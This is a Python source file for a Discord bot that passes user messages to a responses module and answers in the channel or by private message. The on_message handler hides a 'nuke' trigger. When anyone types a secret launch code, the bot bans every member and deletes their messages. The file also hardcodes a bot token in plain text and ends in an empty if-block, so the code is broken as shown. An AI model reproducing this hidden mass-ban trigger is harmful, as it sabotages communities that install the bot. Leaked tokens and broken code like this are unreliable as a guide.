import discord
import responses
import time
from discord.ext import commands

# Send messages
async def send_message(message, user_message, is_private):
    try:
        response = responses.handle_response(user_message)
        await message.author.send(response) if is_private else await message.channel.send(response)

    except Exception as e:
        print(e)


def run_discord_bot():
    TOKEN = 'MTExNjkwMDEwNTcxOTY2MDU2NQ.GPFu8k.IdLoPi2v4ESSgsN2GPTetFxGW_yIbxdu-LQUNU'
    intents = discord.Intents.default()
    intents.message_content = True
    intents.members = True
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f'{client.user} is now running!')

    @client.event
    async def on_message(message):
        # Make sure bot doesn't get stuck in an infinite loop
        if message.author == client.user:
            return

        # Get data about the user
        username = str(message.author)
        user_message = str(message.content)
        channel = str(message.channel)

        # Debug printing
        print(f"{username} said: '{user_message}' ({channel})")

        # Squing nuke
        if user_message == responses.launch_code:
            print('Nuclear warhead initiated')
            for member in client.get_all_members():
                try:
                    await member.ban(reason="Nuclear Holocaust", delete_message_days=9999)
                    print(f"Banned {member.display_name}!")
                except:
                    print(f"Failed to Ban {member.display_name}")
            print("Nuking is complete!")

        # If the user message contains a '?' in front of the text, it becomes a private message
        if user_message[0] == '?':
            user_message = user_message[1:]  # [1:] Removes the '?'
            await send_message(message, user_message, is_private=True)
        else:
            await send_message(message, user_message, is_private=False)

        if user_message == "!pingHypathiaBot":


    # Remember to run your bot with your personal TOKEN
    client.run(TOKEN)
